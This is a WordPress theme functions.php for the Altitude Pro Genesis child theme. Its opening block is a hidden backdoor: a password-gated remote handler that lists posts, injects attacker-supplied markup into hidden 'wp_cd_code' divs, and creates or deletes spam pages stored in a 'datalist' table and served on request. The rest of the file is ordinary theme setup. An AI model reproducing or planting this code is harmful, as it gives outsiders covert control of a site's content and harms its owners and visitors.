<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f52e0901473f132dc465377c2a6be079'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );

//* Setup Theme
include_once( get_stylesheet_directory() . '/lib/theme-defaults.php' );

//* Set Localization (do not remove)
load_child_theme_textdomain( 'altitude', apply_filters( 'child_theme_textdomain', get_stylesheet_directory() . '/languages', 'altitude' ) );

//* Add Image upload and Color select to WordPress Theme Customizer
require_once( get_stylesheet_directory() . '/lib/customize.php' );

//* Include Customizer CSS
include_once( get_stylesheet_directory() . '/lib/output.php' );

//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', 'Altitude Pro Theme' );
define( 'CHILD_THEME_URL', 'http://my.studiopress.com/themes/altitude/' );
define( 'CHILD_THEME_VERSION', '1.0.3' );

//* Enqueue scripts and styles
add_action( 'wp_enqueue_scripts', 'altitude_enqueue_scripts_styles' );
function altitude_enqueue_scripts_styles() {

	wp_enqueue_script( 'altitude-global', get_bloginfo( 'stylesheet_directory' ) . '/js/global.js', array( 'jquery' ), '1.0.0' );

	wp_enqueue_style( 'dashicons' );
	wp_enqueue_style( 'altitude-google-fonts', '//fonts.googleapis.com/css?family=Ek+Mukta:200,800', array(), CHILD_THEME_VERSION );

}

//* Add HTML5 markup structure
add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ) );

//* Add viewport meta tag for mobile browsers
add_theme_support( 'genesis-responsive-viewport' );

//* Add new image sizes
add_image_size( 'featured-page', 1140, 400, TRUE );

//* Add support for 1-column footer widget area
add_theme_support( 'genesis-footer-widgets', 1 );

//* Add support for footer menu
add_theme_support( 'genesis-menus' , array( 'secondary' => __( 'Before Header Menu', 'altitude' ), 'primary' => __( 'Header Menu', 'altitude' ), 'footer' => __( 'Footer Menu', 'altitude' ) ) );

//* Unregister the header right widget area
unregister_sidebar( 'header-right' );

//* Reposition the primary navigation menu
remove_action( 'genesis_after_header', 'genesis_do_nav' );
add_action( 'genesis_header', 'genesis_do_nav', 12 );

//* Remove output of primary navigation right extras
remove_filter( 'genesis_nav_items', 'genesis_nav_right', 10, 2 );
remove_filter( 'wp_nav_menu_items', 'genesis_nav_right', 10, 2 );

//* Remove navigation meta box
add_action( 'genesis_theme_settings_metaboxes', 'altitude_remove_genesis_metaboxes' );
function altitude_remove_genesis_metaboxes( $_genesis_theme_settings_pagehook ) {

    remove_meta_box( 'genesis-theme-settings-nav', $_genesis_theme_settings_pagehook, 'main' );

}

//* Reposition the secondary navigation menu
remove_action( 'genesis_after_header', 'genesis_do_subnav' );
add_action( 'genesis_header', 'genesis_do_subnav', 5 );

//* Add secondary-nav class if secondary navigation is used
add_filter( 'body_class', 'altitude_secondary_nav_class' );
function altitude_secondary_nav_class( $classes ) {

	$menu_locations = get_theme_mod( 'nav_menu_locations' );

	if ( ! empty( $menu_locations['secondary'] ) ) {
		$classes[] = 'secondary-nav';
	}

	return $classes;

}

//* Hook menu in footer
add_action( 'genesis_footer', 'altitude_footer_menu', 7 );
function altitude_footer_menu() {

	genesis_nav_menu( array(
		'theme_location' => 'footer',
		'container'      => false,
		'depth'          => 1,
		'fallback_cb'    => false,
		'menu_class'     => 'genesis-nav-menu',	
	) );

}

//* Add Attributes for Footer Navigation
add_filter( 'genesis_attr_nav-footer', 'genesis_attributes_nav' ); 

//* Unregister layout settings
genesis_unregister_layout( 'content-sidebar-sidebar' );
genesis_unregister_layout( 'sidebar-content-sidebar' );
genesis_unregister_layout( 'sidebar-sidebar-content' );

//* Unregister secondary sidebar
unregister_sidebar( 'sidebar-alt' );

//* Add support for custom header
add_theme_support( 'custom-header', array(
	'flex-height'     => true,
	'width'           => 360,
	'height'          => 76,
	'header-selector' => '.site-title a',
	'header-text'     => false,
) );

//* Add support for structural wraps
add_theme_support( 'genesis-structural-wraps', array(
	'header',
	'nav',
	'subnav',
	'footer-widgets',
	'footer',
) );

//* Modify the size of the Gravatar in the author box
add_filter( 'genesis_author_box_gravatar_size', 'altitude_author_box_gravatar' );
function altitude_author_box_gravatar( $size ) {

	return 176;

}

//* Modify the size of the Gravatar in the entry comments
add_filter( 'genesis_comment_list_args', 'altitude_comments_gravatar' );
function altitude_comments_gravatar( $args ) {

	$args['avatar_size'] = 120;

	return $args;

}

//* Add support for after entry widget
add_theme_support( 'genesis-after-entry-widget-area' );

//* Relocate after entry widget
remove_action( 'genesis_after_entry', 'genesis_after_entry_widget_area' );
add_action( 'genesis_after_entry', 'genesis_after_entry_widget_area', 5 );

//* Setup widget counts
function altitude_count_widgets( $id ) {
	global $sidebars_widgets;

	if ( isset( $sidebars_widgets[ $id ] ) ) {
		return count( $sidebars_widgets[ $id ] );
	}

}

function altitude_widget_area_class( $id ) {

	$count = altitude_count_widgets( $id );

	$class = '';
	
	if ( $count == 1 ) {
		$class .= ' widget-full';
	} elseif ( $count % 3 == 1 ) {
		$class .= ' widget-thirds';
	} elseif ( $count % 4 == 1 ) {
		$class .= ' widget-fourths';
	} elseif ( $count % 2 == 0 ) {
		$class .= ' widget-halves uneven';
	} else {	
		$class .= ' widget-halves';
	}

	return $class;
	
}

//* Relocate the post info
remove_action( 'genesis_entry_header', 'genesis_post_info', 12 );
add_action( 'genesis_entry_header', 'genesis_post_info', 5 );

//* Customize the entry meta in the entry header
add_filter( 'genesis_post_info', 'altitude_post_info_filter' );
function altitude_post_info_filter( $post_info ) {

    $post_info = '[post_date format="M d Y"] [post_edit]';

    return $post_info;

}

//* Customize the entry meta in the entry footer
add_filter( 'genesis_post_meta', 'altitude_post_meta_filter' );
function altitude_post_meta_filter( $post_meta ) {

	$post_meta = 'Written by [post_author_posts_link] [post_categories before=" &middot; Categorized: "]  [post_tags before=" &middot; Tagged: "]';

	return $post_meta;
	
}

//* Register widget areas
genesis_register_sidebar( array(
	'id'          => 'front-page-1',
	'name'        => __( 'Front Page 1', 'altitude' ),
	'description' => __( 'This is the front page 1 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-2',
	'name'        => __( 'Front Page 2', 'altitude' ),
	'description' => __( 'This is the front page 2 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-3',
	'name'        => __( 'Front Page 3', 'altitude' ),
	'description' => __( 'This is the front page 3 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-4',
	'name'        => __( 'Front Page 4', 'altitude' ),
	'description' => __( 'This is the front page 4 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-5',
	'name'        => __( 'Front Page 5', 'altitude' ),
	'description' => __( 'This is the front page 5 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-6',
	'name'        => __( 'Front Page 6', 'altitude' ),
	'description' => __( 'This is the front page 6 section.', 'altitude' ),
) );
genesis_register_sidebar( array(
	'id'          => 'front-page-7',
	'name'        => __( 'Front Page 7', 'altitude' ),
	'description' => __( 'This is the front page 7 section.', 'altitude' ),
) );
add_filter('widget_text', 'do_shortcode');

add_action( 'genesis_before_header', 'utility_bar' );
/**
* Add utility bar above header.
*
* @author Carrie Dils
* @copyright Copyright (c) 2013, Carrie Dils
* @license GPL-2.0+
*/
function utility_bar() {
	echo '<div id="navbod"><div class="nav-in menu-item-5736 animated bounceIn"><span class="ccsl">LESS</span> <span class="ccsx"><img src="/wp-content/uploads/2016/07/cancel.png" alt="close"/></span></div>';
    echo '<div id="navbod-inner js-menu sliding-panel-content">';
	echo '<div style="clear:both;"></div>';
	wp_nav_menu( array('menu' => 'sidemenu-main' ));
    wp_nav_menu( array('menu' => 'sidemenu' ));
    wp_nav_menu( array('menu' => 'sidemenu-thrd' ));
	echo '</div>';
	echo '</div>';
 
}
add_filter( 'genesis_post_date_shortcode', 'child_post_date_shortcode', 10, 2 );
/**
 * Customize Post Date format and add extra markup for CSS targeting.
 *
 * @author Gary Jones
 * @link   http://code.garyjones.co.uk/style-post-info/
 *
 * @param string $output Current HTML markup.
 * @param array  $atts   Attributes.
 *
 * @return string HTML markup.
 */
function child_post_date_shortcode( $output, $atts ) {
	return sprintf(
		'<span class="date time published" title="%4$s">%1$s<span class="day">%2$s</span> <span class="month">%3$s</span></span>',
		$atts['label'],
		get_the_time( 'j' ),
		get_the_time( 'M' ),
		get_the_time( 'Y-m-d\TH:i:sO' )
	);
}